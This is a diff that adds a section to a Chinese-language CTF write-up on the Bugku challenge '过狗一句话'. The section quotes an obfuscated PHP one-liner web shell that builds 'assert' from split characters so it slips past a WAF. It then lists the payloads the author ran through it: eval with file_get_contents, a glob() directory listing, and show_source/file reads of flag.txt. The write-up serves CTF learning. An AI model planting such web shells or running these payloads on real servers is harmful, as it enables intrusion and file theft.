@@ -134,6 +134,48 @@ class Flag{//flag.php
 &emsp;&emsp;这里要注意的是`file=hint.php`，因为要利用php对象反序列化要`先声明对象`，所以要将hint.php包含进来。
 
 &emsp;&emsp;总的来说，这道题的考察点算是比较多的，包括：php伪协议、文件包含、php反序列化，所以质量还是可以的。
+
+### 过狗一句话
+&emsp;&emsp;题目描述：
+>http://120.24.86.145:8010/
+>送给大家一个过狗一句话
+><?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?>
+
+&emsp;&emsp;这个一句话组合起来实际是：`assert($_GET['s'])`，验证一下，发现确实可行。
+<div align="center">
+    <img src="/images/posts/bugku/36.png" />  
+</div>
+&emsp;&emsp;但发现在执行`system`函数的时候无返回结果估计被禁用了。
+<div align="center">
+    <img src="/images/posts/bugku/37.png" />  
+</div>
+&emsp;&emsp;接着使用php读取文件的代码：
+```php
+eval("echo file_get_contents('flag.txt');")
+```
+<div align="center">
+    <img src="/images/posts/bugku/38.png" />  
+</div>
+&emsp;&emsp;这里的`flag.txt`是我自己猜测的，但结果还真被我猜对了。。。
+
+&emsp;&emsp;这道题解得有点侥幸，如果flag不存放在flag.txt，那么这方法将利用不了，所以为了解决这个问题，自己特别找了这道题的writeup，介绍一种使用php代码遍历当前目录的文件的方法：php中的`glob()`函数，详细说明如下：
+<div align="center">
+    <img src="/images/posts/bugku/39.png" />  
+</div>
+&emsp;&emsp;所以我们可以使用`print_r(glob("*.*"))`来打印当前目录下存在的文件。
+<div align="center">
+    <img src="/images/posts/bugku/40.png" />  
+</div>
+&emsp;&emsp;然后再介绍几种读取文件的方法：
+```php
+show_source('flag.txt');
+var_dump(file("flag.txt"));
+print_r(file("flag.txt"));
+```
+&emsp;&emsp;
+&emsp;&emsp;
+&emsp;&emsp;
+&emsp;&emsp;
 &emsp;&emsp;
 &emsp;&emsp;
 &emsp;&emsp;
